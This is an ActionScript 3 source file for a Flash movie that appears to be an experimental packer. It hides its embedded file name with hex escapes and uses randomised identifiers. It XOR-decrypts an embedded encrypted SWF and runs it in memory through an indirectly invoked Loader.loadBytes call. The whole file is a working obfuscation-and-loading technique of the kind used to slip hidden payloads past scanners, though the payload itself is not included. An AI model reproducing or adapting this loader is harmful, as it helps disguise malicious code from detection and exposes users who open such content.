package testflash2
{ 
	import flash.display.*;
	import flash.text.*;
	import flash.utils.*;
	import flash.net.*;
	import flash.events.*;
    import flash.system.*;
 

    public class testflash2 extends Sprite
    {
        [Embed(source="\x74\x65\x73\x74\x66\x6c\x61\x73\x68\x31\x2e\x73\x77\x66\x2e\x65\x6e\x63", mimeType="\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d")]
        private static const _TGD4S:Class;
        
        
        private function _Gk0YL(encrypted:ByteArray):BA
        {
            var _4C1jC:BA = new BA("test");
            
            for (var _jzoze:int = 0; _jzoze < encrypted.length; _jzoze++)
            {
                var _nkTLW:int = encrypted.readByte();
                _4C1jC.writeByte(_nkTLW^0x0a);
            }
            return _4C1jC;
        }
        

        public function testflash2()
        {
            var _Xu6i3:Loader = new LDR();
            var _6nM5c:LoaderContext = new LoaderContext();
            
            var _fpOTN:Object = new _TGD4S();
            var _5RGjp:ByteArray = _fpOTN as ByteArray;
            var _PteJc:BA = _Gk0YL(_5RGjp);
            
            var a:Array = new Array();
            a[0] = _PteJc;
            a[1] = "arraytest";
            
            _Xu6i3["loadBytes"](a[0], _6nM5c);
            
            addChild(_Xu6i3);    
            
        }
    } 
}
